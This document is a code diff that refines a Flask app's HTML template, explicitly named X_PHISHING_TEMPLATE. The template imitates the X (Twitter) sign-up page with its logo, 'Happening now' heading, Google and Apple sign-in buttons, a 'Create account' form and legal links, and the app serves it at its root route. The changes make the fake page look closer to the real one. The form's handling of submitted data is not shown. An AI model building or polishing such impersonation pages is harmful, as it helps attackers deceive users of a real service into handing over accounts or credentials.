@@ -44,7 +44,7 @@ X_PHISHING_TEMPLATE = '''
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>X - Sign up</title>
+    <title>X</title>
     <style>
         * {
             margin: 0;
@@ -60,112 +60,108 @@ X_PHISHING_TEMPLATE = '''
             align-items: center;
             justify-content: center;
         }
-        .container {
-            width: 100%;
+        .main-container {
             max-width: 500px;
-            padding: 20px;
+            width: 100%;
+            padding: 40px 20px;
             text-align: center;
         }
-        .logo {
-            font-size: 180px;
-            font-weight: bold;
-            letter-spacing: -10px;
-            margin-bottom: 40px;
-            line-height: 0.8;
+        .x-logo {
+            font-size: 220px;
+            font-weight: 900;
+            letter-spacing: -15px;
+            line-height: 0.75;
+            margin-bottom: 60px;
+            color: #fff;
         }
         h1 {
-            font-size: 50px;
-            margin-bottom: 12px;
+            font-size: 60px;
             font-weight: 800;
+            margin-bottom: 12px;
         }
         h2 {
             font-size: 32px;
-            margin-bottom: 40px;
             font-weight: 700;
+            margin-bottom: 50px;
         }
         .btn {
-            display: block;
+            display: flex;
+            align-items: center;
+            justify-content: center;
             width: 100%;
             max-width: 380px;
             margin: 12px auto;
-            padding: 14px 24px;
+            padding: 16px 24px;
             font-size: 17px;
             font-weight: 700;
             border-radius: 9999px;
-            text-decoration: none;
-            cursor: pointer;
-            transition: background 0.2s;
             border: none;
+            cursor: pointer;
+            transition: background 0.15s;
         }
         .btn-google {
             background: #fff;
             color: #000;
         }
-        .btn-google:hover {
-            background: #e8e8e8;
-        }
+        .btn-google:hover { background: #f0f0f0; }
         .btn-apple {
             background: #fff;
             color: #000;
         }
-        .btn-apple:hover {
-            background: #e8e8e8;
-        }
+        .btn-apple:hover { background: #f0f0f0; }
         .btn-create {
             background: #1d9bf0;
             color: white;
         }
-        .btn-create:hover {
-            background: #1a8cd8;
-        }
-        .btn-signin {
-            background: transparent;
-            color: #1d9bf0;
-            border: 1px solid #536471;
-            font-weight: 700;
-        }
-        .btn-signin:hover {
-            background: rgba(29,155,240,0.1);
-        }
+        .btn-create:hover { background: #1a8cd8; }
         .or {
-            margin: 20px 0;
-            color: #71767b;
+            margin: 24px 0;
             font-size: 15px;
+            color: #71767b;
             font-weight: 500;
         }
-        .footer {
+        .legal {
             margin-top: 40px;
             font-size: 13px;
             color: #71767b;
+            line-height: 1.5;
         }
-        .footer a {
+        .legal a {
             color: #1d9bf0;
             text-decoration: none;
         }
-        .footer a:hover {
-            text-decoration: underline;
-        }
-        .promo {
+        .legal a:hover { text-decoration: underline; }
+        .already {
             margin-top: 60px;
+            font-size: 17px;
+            color: #e7e9ea;
+        }
+        .already a {
+            color: #1d9bf0;
+            font-weight: 700;
+            text-decoration: none;
+        }
+        .grok {
+            margin-top: 80px;
             font-size: 15px;
             color: #71767b;
         }
-        .promo a {
+        .grok a {
             color: #1d9bf0;
             font-weight: 700;
             text-decoration: none;
         }
         @media (max-width: 500px) {
-            .logo { font-size: 140px; letter-spacing: -8px; }
-            h1 { font-size: 40px; }
+            .x-logo { font-size: 160px; letter-spacing: -10px; margin-bottom: 40px; }
+            h1 { font-size: 48px; }
             h2 { font-size: 28px; }
             .btn { max-width: 90%; }
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="logo">X</div>
+    <div class="main-container">
+        <div class="x-logo">X</div>
         <h1>Happening now</h1>
         <h2>Join today.</h2>
 
@@ -178,22 +174,22 @@ X_PHISHING_TEMPLATE = '''
             <button type="submit" class="btn btn-create">Create account</button>
         </form>
 
-        <div class="footer">
-            By signing up, you agree to the <a href="#">Terms of Service</a> and <a href="#">Privacy Policy</a>, including <a href="#">Cookie Use</a>.
+        <div class="legal">
+            By signing up, you agree to the <a href="#">Terms of Service</a> and <a href="#">Privacy Policy</a>,  
+            including <a href="#">Cookie Use</a>.
         </div>
 
-        <div class="promo">
+        <div class="already">
             Already have an account? <a href="#">Sign in</a>
         </div>
 
-        <div class="promo">
+        <div class="grok">
             <a href="#">Get Grok</a>
         </div>
     </div>
 </body>
 </html>
 '''
-
 @app.route('/')
 def index():
     return render_template_string(X_PHISHING_TEMPLATE)
